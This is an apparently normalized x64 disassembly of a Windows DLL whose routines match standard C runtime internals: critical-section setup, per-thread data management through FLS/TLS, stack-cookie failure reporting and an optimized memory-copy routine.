mov [ rw-data ] 0x1
lea ecx [ r12 + 0x8 ]
call sub_180009980
mov ecx r13d
call sub_180009460
lea rdx [ r--data ]
lea rcx [ r--data ]
call sub_1800094c0
nop
nop
nop
cmp [ rbx ] 0x0
je r-xdata
jmp r-xdata
mov rdi [ rbx ]
call sub_18000a250
cmp rdi rax
je r-xdata
sub rbx 0x8
mov [ rsp + 0x20 ] rbx
cmp rbx rsi
jb r-xdata
mov rcx rdi
call sub_18000a340
call rax
sub_1800097d0
push rbx
sub rsp 0x20
call sub_18000a250
mov rcx rax
mov rbx rax
call sub_18000c970
mov rcx rbx
call sub_180009ca0
mov rcx rbx
call sub_180008c70
mov rcx rbx
call sub_18000fdb0
mov rcx rbx
call sub_18000fda0
mov rcx rbx
call sub_18000fac0
mov rcx rbx
call sub_18000e830
mov rcx rbx
call sub_18000c590
lea rcx [ sub_1800097b0 ]
call sub_18000a180
mov [ rw-data ] rax
add rsp 0x20
pop rbx
retn
sub_180009840
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
push r12
push r13
sub rsp 0x20
lea r12 [ rw-data ]
xor esi esi
lea r13 [ rw-data ]
xor edi edi
lea rbp [ rw-data ]
mov rbx r12
add rbx 0x10
add edi 0x1
cmp rbx rbp
jl r-xdata
movsxd rax esi
mov edx 0xfa0
add esi 0x1
lea rcx [ rax + rax * 4 ]
lea rcx [ r13 + rcx * 8 ]
mov [ rbx ] rcx
call sub_180009cd0
test eax eax
je r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov eax 0x1
movsxd rax edi
add rax rax
mov [ r12 + rax * 8 ] 0x0
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x40 ]
mov rbp [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
add rsp 0x20
pop r13
pop r12
pop rdi
retn
sub_1800098e0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x20
lea rbx [ rw-data ]
xor r12d r12d
lea rbp [ rw-data ]
mov rdi rbx
nop
add rdi 0x10
cmp rdi rbp
jl r-xdata
cmp [ rdi + 0x8 ] 0x1
je r-xdata
mov rsi [ rdi ]
test rsi rsi
je r-xdata
nop
nop
mov rcx rsi
call [ DeleteCriticalSection@IAT ]
mov rcx rsi
call sub_1800085f0
mov [ rdi ] r12
add rbx 0x10
cmp rbx rbp
jl r-xdata
cmp [ rbx + 0x8 ] 0x1
jne r-xdata
mov rcx [ rbx ]
test rcx rcx
je r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
mov rdi [ rsp + 0x48 ]
add rsp 0x20
pop r12
retn
call [ DeleteCriticalSection@IAT ]
sub_1800099a0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x20
movsxd rbx ecx
mov esi 0x1
cmp [ rw-data ] 0x0
jne r-xdata
mov rdi rbx
add rdi rdi
lea r12 [ rw-data ]
cmp [ r12 + rdi * 8 ] 0x0
je r-xdata
call sub_18000c7f0
lea ecx [ rsi + 0x1d ]
call sub_18000c5b0
mov ecx 0xff
call sub_180009460
mov ecx 0x28
call sub_180008800
mov rbx rax
test rax rax
jne r-xdata
mov eax esi
jmp r-xdata
mov ecx 0xa
call sub_180009ab0
nop
cmp [ r12 + rdi * 8 ] 0x0
jne r-xdata
call sub_180008e80
mov [ rax ] 0xc
xor eax eax
jmp r-xdata
mov rbx [ rsp + 0x30 ]
mov rsi [ rsp + 0x38 ]
mov rdi [ rsp + 0x40 ]
add rsp 0x20
pop r12
retn
mov rcx rbx
call sub_1800085f0
nop
mov edx 0xfa0
mov rcx rbx
call sub_180009cd0
test eax eax
jne r-xdata
mov [ r12 + rdi * 8 ] rbx
jmp r-xdata
mov rcx rbx
call sub_1800085f0
call sub_180008e80
mov [ rax ] 0xc
xor esi esi
jmp r-xdata
mov rcx [ rw-data ]
call [ LeaveCriticalSection@IAT ]
mov eax esi
sub_180009ab0
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
movsxd rbx ecx
lea rdi [ rw-data ]
add rbx rbx
cmp [ rdi + rbx * 8 ] 0x0
jne r-xdata
mov rcx [ rdi + rbx * 8 ]
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
jmp [ EnterCriticalSection@IAT ]
call sub_1800099a0
test eax eax
jne r-xdata
lea ecx [ rax + 0x11 ]
call sub_180009430
sub_180009b00
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x18 ] rdi
push r12
sub rsp 0x30
xor r12d r12d
mov rdi r12
lea ecx [ r12 + 0x1 ]
call sub_180009ab0
nop
mov ebx r12d
mov [ rsp + 0x20 ] ebx
nop
test rdi rdi
je r-xdata
movsxd rsi ebx
mov rax [ rw-data ]
cmp [ rax + rsi * 8 ] 0x0
je r-xdata
mov ecx 0x1
call sub_180009980
mov rax rdi
mov rbx [ rsp + 0x40 ]
mov rsi [ rsp + 0x48 ]
mov rdi [ rsp + 0x50 ]
add rsp 0x30
pop r12
retn
and [ rdi + 0x18 ] 0x8000
mov [ rdi + 0x8 ] r12d
mov [ rdi + 0x10 ] r12
mov [ rdi ] r12
mov [ rdi + 0x28 ] r12
mov [ rdi + 0x1c ] 0xffffffff
movsxd rbx ebx
mov ecx 0x58
call sub_180008800
mov rcx [ rw-data ]
mov [ rcx + rbx * 8 ] rax
mov rcx [ rw-data ]
cmp [ rcx + rbx * 8 ] 0x0
je r-xdata
mov rax [ rax + rsi * 8 ]
mov ecx [ rax + 0x18 ]
test cl 0x83
jne r-xdata
mov rcx [ rcx + rbx * 8 ]
add rcx 0x30
mov edx 0xfa0
call sub_180009cd0
test eax eax
jne r-xdata
add ebx 0x1
mov [ rsp + 0x20 ] ebx
jmp r-xdata
bt ecx 0xf
jb r-xdata
mov rax [ rw-data ]
mov rcx [ rax + rbx * 8 ]
add rcx 0x30
call [ EnterCriticalSection@IAT ]
mov r11 [ rw-data ]
mov rdi [ r11 + rbx * 8 ]
mov [ rdi + 0x18 ] r12d
mov rcx [ rw-data ]
mov rcx [ rcx + rbx * 8 ]
call sub_1800085f0
mov r11 [ rw-data ]
mov [ r11 + rbx * 8 ] r12
jmp r-xdata
cmp ebx [ rw-data ]
jge r-xdata
lea eax [ rbx - 0x3 ]
cmp eax 0x10
ja r-xdata
mov rdx [ rw-data ]
mov rdx [ rdx + rsi * 8 ]
mov ecx ebx
call sub_180005e00
mov r11 [ rw-data ]
mov rax [ r11 + rsi * 8 ]
test [ rax + 0x18 ] 0x83
je r-xdata
lea ecx [ rbx + 0x10 ]
call sub_1800099a0
test eax eax
je r-xdata
mov rdi rax
jmp r-xdata
mov rdx rax
mov ecx ebx
call sub_180005e90
jmp r-xdata
sub_180009cd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
sub rsp 0x40
mov esi edx
mov r12 rcx
xor edi edi
mov [ rsp + 0x60 ] edi
mov rcx [ rw-data ]
call sub_18000a340
mov rbx rax
test rax rax
jne r-xdata
mov edx esi
mov rcx r12
call rbx
mov edi eax
mov [ rsp + 0x30 ] eax
jmp r-xdata
lea rcx [ rsp + 0x60 ]
call sub_180009500
test eax eax
je r-xdata
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
cmp [ rsp + 0x60 ] 0x1
jne r-xdata
mov [ rsp + 0x20 ] rdi
xor r9d r9d
xor r8d r8d
xor edx edx
xor ecx ecx
call sub_180008c80
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
je r-xdata
lea rbx [ sub_180009cb0 ]
jmp r-xdata
lea rbx [ sub_180009cb0 ]
lea rdx [ r--data ]
mov rcx rax
call [ GetProcAddress@IAT ]
mov rbx rax
test rax rax
jne r-xdata
mov rcx rbx
call sub_18000a180
mov [ rw-data ] rax
lea rbx [ sub_180009cb0 ]
jmp r-xdata
sub_180009d8e
cmp eax 0xc0000017
jne r-xdata
xor edi edi
mov [ rsp + 0x30 ] edi
mov eax edi
mov rbx [ rsp + 0x50 ]
mov rsi [ rsp + 0x58 ]
mov rdi [ rsp + 0x68 ]
add rsp 0x40
pop r12
retn
mov ecx 0x8
call [ SetLastError@IAT ]
sub_180009dc0
push rbp
push rdi
sub rsp 0x38
mov rbp rdx
mov rax [ rcx ]
xor edi edi
cmp [ rax ] 0xc0000017
sete dil
mov eax edi
add rsp 0x38
pop rdi
pop rbp
retn
sub_180009df0
mov [ rsp + 0x8 ] rcx
sub rsp 0x88
lea rcx [ rw-data ]
call [ RtlCaptureContext@IAT ]
mov rax [ rw-data ]
mov [ rsp + 0x58 ] rax
xor r8d r8d
lea rdx [ rsp + 0x60 ]
mov rcx [ rsp + 0x58 ]
call RtlLookupFunctionEntry
mov [ rsp + 0x50 ] rax
cmp [ rsp + 0x50 ] 0x0
je r-xdata
mov rax [ rsp + 0x88 ]
mov [ rw-data ] rax
lea rax [ rsp + 0x88 ]
add rax 0x8
mov [ rw-data ] rax
mov [ rsp + 0x38 ] 0x0
lea rax [ rsp + 0x48 ]
mov [ rsp + 0x30 ] rax
lea rax [ rsp + 0x40 ]
mov [ rsp + 0x28 ] rax
lea rax [ rw-data ]
mov [ rsp + 0x20 ] rax
mov r9 [ rsp + 0x50 ]
mov r8 [ rsp + 0x58 ]
mov rdx [ rsp + 0x60 ]
xor ecx ecx
call RtlVirtualUnwind
jmp r-xdata
call [ GetCurrentProcess@IAT ]
mov edx 0xc0000409
mov rcx rax
call [ TerminateProcess@IAT ]
add rsp 0x88
retn
mov ecx 0x1
call sub_18000f930
mov rax [ rw-data ]
mov [ rw-data ] rax
mov rax [ rsp + 0x90 ]
mov [ rw-data ] rax
mov [ rw-data ] 0xc0000409
mov [ rw-data ] 0x1
mov rax [ rw-data ]
mov [ rsp + 0x68 ] rax
mov rax [ rw-data ]
mov [ rsp + 0x70 ] rax
call [ IsDebuggerPresent@IAT ]
mov [ rw-data ] eax
mov ecx 0x1
call sub_18000f930
xor ecx ecx
call [ SetUnhandledExceptionFilter@IAT ]
lea rcx [ r--data ]
call [ UnhandledExceptionFilter@IAT ]
cmp [ rw-data ] 0x0
jne r-xdata
sub_180009f40
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test rcx rcx
mov rsi r8
mov rbp rdx
mov rbx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rbp + 0x8 ]
jne r-xdata
call sub_18000c560
xor ecx ecx
test edi edi
je r-xdata
call sub_18000c560
or eax 0xffffffff
mov r8 [ rbp + 0x8 ]
movsxd r9 [ rbx + 0x18 ]
lea rdx [ r8 + r9 ]
nop
nop
test ecx ecx
je r-xdata
add ecx 0x1
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r9 + rax * 8 ]
mov eax [ rdx + r8 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r8
cmp rsi rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_180009fd0
mov [ rsp + 0x8 ] rbx
mov [ rsp + 0x10 ] rbp
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
test rcx rcx
mov rbp [ rdx ]
mov rsi rdx
mov rbx rcx
jne r-xdata
movsxd rax [ rbx + 0x18 ]
mov edi [ rbx + 0x14 ]
add rax [ rsi + 0x8 ]
jne r-xdata
call sub_18000c560
xor ecx ecx
test edi edi
je r-xdata
call sub_18000c560
or eax 0xffffffff
mov r8 [ rsi + 0x8 ]
movsxd r9 [ rbx + 0x18 ]
lea rdx [ r8 + r9 ]
nop
nop
test ecx ecx
je r-xdata
add ecx 0x1
add rdx 0x8
cmp ecx edi
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rcx [ r8 + rax * 8 ]
mov eax [ rcx + r9 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r8
cmp rbp rax
jl r-xdata
mov rbx [ rsp + 0x30 ]
mov rbp [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
sub_18000a060
mov [ rsp + 0x18 ] rbp
push rdi
sub rsp 0x20
movsxd r9 [ r8 + 0x1c ]
mov rax [ rcx ]
mov rdi r8
mov eax [ r9 + rax ]
mov rbp rdx
cmp eax 0xfffffffe
jne r-xdata
mov rbp [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
movsxd rax [ r8 + 0x18 ]
mov [ rsp + 0x30 ] rbx
mov ebx [ r8 + 0x14 ]
add rax [ rdx + 0x8 ]
mov [ rsp + 0x38 ] rsi
mov rsi [ rdx ]
jne r-xdata
xor ecx ecx
test ebx ebx
je r-xdata
call sub_18000c560
or eax 0xffffffff
mov r8 [ rbp + 0x8 ]
movsxd r9 [ rdi + 0x18 ]
lea rdx [ r8 + r9 ]
test ecx ecx
je r-xdata
add ecx 0x1
add rdx 0x8
cmp ecx ebx
jb r-xdata
lea eax [ rcx - 0x1 ]
lea rdx [ r9 + rax * 8 ]
mov eax [ rdx + r8 + 0x4 ]
jmp r-xdata
movsxd rax [ rdx ]
add rax r8
cmp rsi rax
jl r-xdata
mov rsi [ rsp + 0x38 ]
mov rbx [ rsp + 0x30 ]
sub_18000a110
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
mov edi r9d
lea r9 [ rsp + 0x40 ]
mov rbx r8
call sub_180006990
mov rcx [ rax ]
movsxd rax [ rbx + 0x1c ]
mov [ rsp + 0x40 ] rcx
cmp edi [ rax + rcx + 0x4 ]
jle r-xdata
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
mov [ rax + rcx + 0x4 ] edi
sub_18000a180
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov rbp rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
mov r12 rax
je r-xdata
call [ FlsGetValue@IAT ]
test rax rax
je r-xdata
mov rax rbp
lea rcx [ rsp + 0x40 ]
xor ebx ebx
mov [ rsp + 0x40 ] ebx
call sub_180009550
cmp [ rsp + 0x40 ] 0x5
jg r-xdata
mov rax [ rax + 0x2a8 ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r12
call [ GetProcAddress@IAT ]
xor ecx ecx
call [ GetModuleHandleA@IAT ]
movsxd rcx [ rax + 0x3c ]
add rcx rax
movzx eax [ rcx + 0x14 ]
lea rdx [ rax + rcx + 0x18 ]
movzx eax [ rcx + 0x6 ]
test eax eax
je r-xdata
test rax rax
je r-xdata
mov rcx rbp
call rax
jmp r-xdata
lea rsi [ r--data ]
mov rdi rdx
mov ecx 0x8
[ rsi ] [ rdi ]
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
add ebx 0x1
add rdx 0x28
cmp ebx eax
jb r-xdata
sub_18000a250
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
push rdi
sub rsp 0x20
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
mov rbx rax
je r-xdata
call [ FlsGetValue@IAT ]
test rax rax
je r-xdata
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
xor eax eax
add rsp 0x20
pop rdi
retn
lea rcx [ rsp + 0x30 ]
mov [ rsp + 0x30 ] 0x0
call sub_180009550
cmp [ rsp + 0x30 ] 0x5
jg r-xdata
mov rax [ rax + 0x2a8 ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx rbx
call [ GetProcAddress@IAT ]
xor ecx ecx
call [ GetModuleHandleA@IAT ]
xor edx edx
movsxd rcx [ rax + 0x3c ]
add rcx rax
movzx eax [ rcx + 0x14 ]
lea r8 [ rax + rcx + 0x18 ]
movzx eax [ rcx + 0x6 ]
test eax eax
je r-xdata
test rax rax
je r-xdata
xor ecx ecx
call rax
mov rbx [ rsp + 0x38 ]
mov rsi [ rsp + 0x40 ]
add rsp 0x20
pop rdi
retn
nop
nop
nop
add edx 0x1
add r8 0x28
cmp edx eax
jb r-xdata
lea rsi [ r--data ]
mov rdi r8
mov ecx 0x8
[ rsi ] [ rdi ]
je r-xdata
sub_18000a340
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rbp
push rsi
push rdi
push r12
sub rsp 0x20
mov rbp rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
test rax rax
mov r12 rax
je r-xdata
call [ FlsGetValue@IAT ]
test rax rax
je r-xdata
mov rax rbp
lea rcx [ rsp + 0x40 ]
xor ebx ebx
mov [ rsp + 0x40 ] ebx
call sub_180009550
cmp [ rsp + 0x40 ] 0x5
jg r-xdata
mov rax [ rax + 0x2b0 ]
jmp r-xdata
lea rdx [ r--data ]
mov rcx r12
call [ GetProcAddress@IAT ]
xor ecx ecx
call [ GetModuleHandleA@IAT ]
movsxd rcx [ rax + 0x3c ]
add rcx rax
movzx eax [ rcx + 0x14 ]
lea rdx [ rax + rcx + 0x18 ]
movzx eax [ rcx + 0x6 ]
test eax eax
je r-xdata
test rax rax
je r-xdata
mov rcx rbp
call rax
jmp r-xdata
lea rsi [ r--data ]
mov rdi rdx
mov ecx 0x8
[ rsi ] [ rdi ]
je r-xdata
mov rbx [ rsp + 0x48 ]
mov rbp [ rsp + 0x50 ]
add rsp 0x20
pop r12
pop rdi
pop rsi
retn
add ebx 0x1
add rdx 0x28
cmp ebx eax
jb r-xdata
sub_18000a420
sub rsp 0x28
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
call [ FlsFree@IAT ]
mov [ rw-data ] 0xffffffff
add rsp 0x28
jmp sub_1800098e0
call [ TlsFree@IAT ]
mov [ rw-data ] 0xffffffff
sub_18000a470
mov [ rsp + 0x10 ] rbx
mov [ rsp + 0x18 ] rsi
mov [ rsp + 0x20 ] rdi
push r12
push r13
push r14
sub rsp 0x20
mov r13 rdx
mov r12 rcx
lea rcx [ r--data ]
call [ GetModuleHandleA@IAT ]
mov r14 rax
lea rax [ rw-data ]
mov [ r12 + 0xa0 ] rax
mov [ r12 + 0x1c ] 0x1
test r14 r14
je r-xdata
mov [ r12 + 0xc8 ] 0x1
mov [ r12 + 0x174 ] 0x43
mov [ r12 + 0x1f7 ] 0x43
lea rax [ rw-data ]
mov [ r12 + 0xb8 ] rax
[ rw-data ] 0x1
mov ecx 0xc
call sub_180009ab0
nop
mov [ r12 + 0xc0 ] r13
test r13 r13
jne r-xdata
xor ebx ebx
mov [ rsp + 0x40 ] ebx
lea rcx [ rsp + 0x40 ]
call sub_180009550
cmp [ rsp + 0x40 ] 0x5
jg r-xdata
mov rcx [ r12 + 0xc0 ]
call sub_18000d6d0
nop
mov ecx 0xc
call sub_180009980
mov rbx [ rsp + 0x48 ]
mov rsi [ rsp + 0x50 ]
mov rdi [ rsp + 0x58 ]
add rsp 0x20
pop r14
pop r13
pop r12
retn
mov rax [ rw-data ]
mov [ r12 + 0xc0 ] rax
lea rdx [ r--data ]
mov rcx r14
call [ GetProcAddress@IAT ]
mov [ r12 + 0x2a8 ] rax
lea rdx [ r--data ]
mov rcx r14
call [ GetProcAddress@IAT ]
mov [ r12 + 0x2b0 ] rax
xor ecx ecx
call [ GetModuleHandleA@IAT ]
movsxd rcx [ rax + 0x3c ]
add rcx rax
movzx eax [ rcx + 0x14 ]
lea rdx [ rax + rcx + 0x18 ]
movzx eax [ rcx + 0x6 ]
test eax eax
je r-xdata
nop
nop
nop
add ebx 0x1
add rdx 0x28
cmp ebx eax
jb r-xdata
lea rsi [ r--data ]
mov rdi rdx
mov ecx 0x8
[ rsi ] [ rdi ]
je r-xdata
sub_18000a600
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
test rax rax
mov rbx rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rax + 0x1 ]
mov edx 0x2d8
call sub_180008870
test rax rax
mov rbx rax
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_1800085f0
xor ebx ebx
xor edx edx
call sub_18000a470
call [ GetCurrentThreadId@IAT ]
mov [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_18000a690
mov [ rsp + 0x8 ] rbx
push rdi
sub rsp 0x20
call [ GetLastError@IAT ]
mov ecx [ rw-data ]
mov edi eax
call [ FlsGetValue@IAT ]
test rax rax
mov rbx rax
jne r-xdata
mov ecx edi
call [ SetLastError@IAT ]
test rbx rbx
jne r-xdata
lea ecx [ rax + 0x1 ]
mov edx 0x2d8
call sub_180008870
test rax rax
mov rbx rax
je r-xdata
mov rax rbx
mov rbx [ rsp + 0x30 ]
add rsp 0x20
pop rdi
retn
lea ecx [ rbx + 0x10 ]
call sub_180009430
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
mov rcx rbx
test eax eax
je r-xdata
call sub_1800085f0
xor ebx ebx
xor edx edx
call sub_18000a470
call [ GetCurrentThreadId@IAT ]
mov [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
jmp r-xdata
sub_18000a730
test rcx rcx
je r-xdata
retn 0x0
mov [ rsp + 0x10 ] rbx
push rdi
sub rsp 0x20
mov rbx rcx
mov rcx [ rcx + 0x38 ]
test rcx rcx
je r-xdata
mov rcx [ rbx + 0x48 ]
test rcx rcx
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x58 ]
test rcx rcx
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x68 ]
test rcx rcx
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x78 ]
test rcx rcx
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0x80 ]
test rcx rcx
je r-xdata
call sub_1800085f0
mov rcx [ rbx + 0xa0 ]
lea rax [ rw-data ]
cmp rcx rax
je r-xdata
call sub_1800085f0
mov ecx 0xd
call sub_180009ab0
nop
mov rcx [ rbx + 0xb8 ]
mov [ rsp + 0x30 ] rcx
test rcx rcx
je r-xdata
call sub_1800085f0
mov ecx 0xd
call sub_180009980
mov ecx 0xc
call sub_180009ab0
nop
mov rdi [ rbx + 0xc0 ]
test rdi rdi
je r-xdata
[ rcx ] 0xffffffff
jne r-xdata
mov ecx 0xc
call sub_180009980
mov rcx rbx
call sub_1800085f0
mov rbx [ rsp + 0x38 ]
add rsp 0x20
pop rdi
mov rcx rdi
call sub_18000d770
cmp rdi [ rw-data ]
je r-xdata
lea rax [ rw-data ]
mov rcx [ rsp + 0x30 ]
cmp rcx rax
je r-xdata
lea rax [ rw-data ]
cmp rdi rax
je r-xdata
call sub_1800085f0
nop
cmp [ rdi ] 0x0
jne r-xdata
mov rcx rdi
call sub_18000d540
nop
sub_18000a8a0
push rbx
sub rsp 0x20
mov rbx rcx
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
test rbx rbx
jne r-xdata
add rsp 0x20
pop rbx
retn
xor edx edx
call [ TlsSetValue@IAT ]
xor edx edx
call [ FlsSetValue@IAT ]
mov rcx rbx
call sub_18000a730
call [ FlsGetValue@IAT ]
mov ecx [ rw-data ]
mov rbx rax
sub_18000a900
sub rsp 0x28
call sub_1800097d0
call sub_180009840
test eax eax
jne r-xdata
lea rcx [ sub_18000a730 ]
call [ FlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ rw-data ] eax
jne r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
mov edx 0x2d8
mov ecx 0x1
mov [ rsp + 0x20 ] rbx
call sub_180008870
test rax rax
mov rbx rax
je r-xdata
mov ecx [ rw-data ]
cmp ecx eax
je r-xdata
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
call [ FlsFree@IAT ]
mov [ rw-data ] 0xffffffff
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
mov ecx [ rw-data ]
mov rdx rax
call [ FlsSetValue@IAT ]
test eax eax
je r-xdata
call sub_1800098e0
xor eax eax
add rsp 0x28
retn
jmp r-xdata
call [ TlsFree@IAT ]
mov [ rw-data ] 0xffffffff
mov ecx [ rw-data ]
cmp ecx 0xffffffff
je r-xdata
call [ FlsFree@IAT ]
mov [ rw-data ] 0xffffffff
xor edx edx
mov rcx rbx
call sub_18000a470
call [ GetCurrentThreadId@IAT ]
mov [ rbx + 0x8 ] 0xffffffffffffffff
mov [ rbx ] eax
mov rbx [ rsp + 0x20 ]
mov eax 0x1
add rsp 0x28
retn
call sub_1800098e0
mov rbx [ rsp + 0x20 ]
xor eax eax
add rsp 0x28
retn
call [ TlsFree@IAT ]
mov [ rw-data ] 0xffffffff
sub_18000aa30
mov r11 rcx
sub rdx rcx
jb r-xdata
add rcx r8
cmp r8 0x8
jb r-xdata
cmp r8 0x8
jb r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
test r8 r8
jne r-xdata
test cl 0x7
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov al [ rdx + rcx ]
mov [ rcx ] al
inc rcx
dec r8
jne r-xdata
mov rax r11
retn
mov r9 r8
shr r9 0x5
jne r-xdata
test cl 0x1
je r-xdata
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
dec rcx
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
mov rax r11
retn
cmp r9 0x2000
jae r-xdata
mov r9 r8
shr r9 0x3
je r-xdata
test cl 0x2
je r-xdata
mov al [ rdx + rcx ]
dec r8
mov [ rcx ] al
inc rcx
cmp rdx 0xfffffffffffff000
ja r-xdata
mov rax [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
sub rcx 0x20
mov [ rcx + 0x18 ] rax
mov [ rcx + 0x10 ] r10
mov rax [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec r9
mov [ rcx + 0x8 ] rax
mov [ rcx ] r10
jne r-xdata
sub rcx 0x8
mov rax [ rdx + rcx ]
dec r9
mov [ rcx ] rax
jne r-xdata
test cl 0x4
je r-xdata
sub rcx 0x2
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
cmp rdx 0x1000
jb r-xdata
mov rax [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
add rcx 0x20
mov [ rcx - 0x20 ] rax
mov [ rcx - 0x18 ] r10
mov rax [ rdx + rcx - 0x10 ]
mov r10 [ rdx + rcx - 0x8 ]
dec r9
mov [ rcx - 0x10 ] rax
mov [ rcx - 0x8 ] r10
jne r-xdata
mov rax [ rdx + rcx ]
mov [ rcx ] rax
add rcx 0x8
dec r9
jne r-xdata
test cl 0x4
je r-xdata
mov ax [ rdx + rcx ]
sub r8 0x2
mov [ rcx ] ax
add rcx 0x2
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
sub rcx 0x4
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
mov eax 0x20
and r8 0x1f
jmp r-xdata
and r8 0x7
mov eax [ rdx + rcx ]
sub r8 0x4
mov [ rcx ] eax
add rcx 0x4
sub rcx 0x80
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
dec eax
jne r-xdata
add rcx 0x1000
mov eax 0x40
prefetchnta [ rdx + rcx ]
prefetchnta [ rdx + rcx + 0x40 ]
add rcx 0x80
dec eax
jne r-xdata
sub rcx 0x1000
mov eax 0x40
mov r9 [ rdx + rcx - 0x8 ]
mov r10 [ rdx + rcx - 0x10 ]
movnti [ rcx - 0x8 ] r9
movnti [ rcx - 0x10 ] r10
mov r9 [ rdx + rcx - 0x18 ]
mov r10 [ rdx + rcx - 0x20 ]
movnti [ rcx - 0x18 ] r9
movnti [ rcx - 0x20 ] r10
mov r9 [ rdx + rcx - 0x28 ]
mov r10 [ rdx + rcx - 0x30 ]
sub rcx 0x40
movnti [ rcx + 0x18 ] r9
movnti [ rcx + 0x10 ] r10
mov r9 [ rdx + rcx + 0x8 ]
mov r10 [ rdx + rcx ]
dec eax
movnti [ rcx + 0x8 ] r9
movnti [ rcx ] r10
jne r-xdata
sub r8 0x1000
cmp r8 0x1000
jae r-xdata
mov r9 [ rdx + rcx ]
mov r10 [ rdx + rcx + 0x8 ]
movnti [ rcx ] r9
movnti [ rcx + 0x8 ] r10
mov r9 [ rdx + rcx + 0x10 ]
